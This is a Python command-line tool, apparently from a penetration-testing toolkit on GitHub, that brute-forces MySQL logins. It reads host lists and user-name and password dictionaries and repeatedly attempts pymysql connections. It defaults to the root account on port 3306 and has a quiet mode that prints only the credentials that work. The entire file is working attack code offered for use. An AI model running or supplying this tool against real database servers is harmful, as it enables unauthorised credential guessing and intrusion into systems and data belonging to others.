# -*- coding: utf-8 -*-
"""
@author yumu
@version 1.0.2
"""
import argparse
import os, sys
import pymysql

sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from utils import *

colorPrinter = ColorPrinter()
__version__ = "1.0.2"


def print_tool_info():
    print("[ yumueat | https://github.com/yumueat]")
    print("[ Mysql Brute Force Attack Tool | https://github.com/yumueat/Penetration-test-toolkit]")


def get_parser():
    """

    设置命令行参数
    :return:
    """
    parser = argparse.ArgumentParser(description="Mysql Brute Force Attack Tool")
    group = parser.add_argument_group()
    group.add_argument(
        "-v",
        "--version",
        action="store_true",
        help="显示版本信息"
    )
    group.add_argument(
        "-u",
        "--url",
        action="store",
        help="指定要爆破的主机"
    )
    group.add_argument(
        "-nd",
        "--namedirectory",
        action="store",
        help="指定用户名爆破字典"
    )
    group.add_argument(
        "-pd",
        "--passworddirectory",
        action="store",
        help="指定密码爆破字典"
    )
    group.add_argument(
        "-l",
        "--list",
        action="store",
        help="指定要爆破的主机列表文件"
    )
    group.add_argument(
        "-q",
        "--quite",
        action="store_true",
        help="安静模式，只输出成功的结果"
    )
    group.add_argument(
        "-b",
        "--brute",
        action="store_true",
        help="开始爆破"
    )
    group.add_argument(
        "-p",
        "--port",
        action="store",
        help="指定端口"
    )
    group.add_argument(
        "-un",
        "--username",
        action="store",
        help="指定要测试的用户名"
    )
    return parser


def show_version():
    """
    显示版本信息
    :return:
    """
    print(colorPrinter.wrong_text("[ Mysql数据库爆破工具 ]" + __version__))


def brute(host, name_directory, password_directory, hostlist, quite, port, username):
    """
    爆破函数
    :param host: 主机名
    :param name_directory: 用户名字典
    :param password_directory: 密码字典
    :param hostlist: 主机列表
    :param quite: 安静模式
    :param port: 端口
    :param username: 用户名
    :return:
    """
    target_host = []
    target_name = []
    target_password = []
    if host is not None:
        target_host.append(host)

    if username is not None:
        target_name.append(str(username).strip())

    if name_directory is not None:
        try:
            with open(name_directory, "r") as f:
                names = f.readlines()
            for name in names:
                target_name.append(name.strip())
        except:
            print(colorPrinter.wrong_text("用户名字典读取失败，请检查路径和文件名以及是否有读取权限"))

    if password_directory is not None:
        try:
            with open(password_directory, "r") as f:
                passwords = f.readlines()
            for password in passwords:
                target_password.append(password.strip())
        except:
            print(colorPrinter.wrong_text("密码字典读取失败，请检查路径和文件名以及是否有读取权限"))

    if hostlist is not None:
        try:
            with open(hostlist, "r") as f:
                hosts = f.readlines()
            for host in hosts:
                target_host.append(host.strip())
        except:
            print(colorPrinter.wrong_text("主机文件读取失败，请检查路径和文件名以及是否有读取权限"))

    if port is None:
        print(colorPrinter.special_text("未指定端口，使用默认3306端口"))
        port = 3306

    if len(target_host) == 0:
        print(colorPrinter.special_text("未指定主机，使用默认localhost"))
        target_host.append("localhost")

    if len(target_name) == 0:
        print(colorPrinter.special_text("未指定用户名，使用默认root"))
        target_name.append("root")

    if len(target_password) == 0:
        print(colorPrinter.special_text("未指定密码字典，使用默认密码字典"))
        try:
            with open("directory/mysql_dic.txt", "r") as f:
                passwords = f.readlines()
            for password in passwords:
                target_password.append(password.strip())
        except:
            print(colorPrinter.wrong_text("默认密码字典读取失败，请检查默认字典是否被移动或无读取权限"))

    for host in target_host:
        for user in target_name:
            for password in target_password:
                if quite:
                    try:
                        pymysql.connect(host=host, port=int(port), user=user, password=password)
                        print(colorPrinter.info_text("[+] " + user + " " + password + " 成功"))
                        break
                    except:
                        continue
                else:
                    try:
                        pymysql.connect(host=host, port=int(port), user=user, password=password)
                        print(colorPrinter.info_text("[+] " + user + " " + password + " 成功"))
                        break
                    except:
                        print(colorPrinter.warn_text("[-] " + user + " " + password + " 失败"))


def main():
    parser = get_parser()
    args = parser.parse_args()

    print_tool_info()
    if args.version:
        show_version()
    elif args.brute:
        brute(host=args.url, hostlist=args.list, name_directory=args.namedirectory,
              password_directory=args.passworddirectory, quite=args.quite, port=args.port, username=args.username)
    else:
        parser.print_help()


if __name__ == '__main__':
    main()
